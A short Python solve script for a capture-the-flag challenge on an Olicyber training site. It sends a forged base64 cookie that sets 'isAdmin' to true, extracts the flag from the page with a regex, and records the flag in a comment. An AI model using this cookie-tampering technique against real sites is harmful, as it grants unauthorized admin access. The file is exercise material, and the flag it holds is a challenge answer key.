import requests
import re


site = "http://wikiptm.challs.olicyber.it"
cookies = {"data" : "eyJpbmRleCI6ImluZGV4Lmh0bWwiLCJkYXRlIjoiMjAyNS0xMC0xOVQyMDoxMzoyMi45NTRaIiwiaXNBZG1pbiI6dHJ1ZX0="} #is_admin = true
r = requests.get(f"{site}/Capture_the_flag.html", cookies=cookies).text
match = re.search(r'ptm\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

# ptm{fl465_3v3rywh3r3}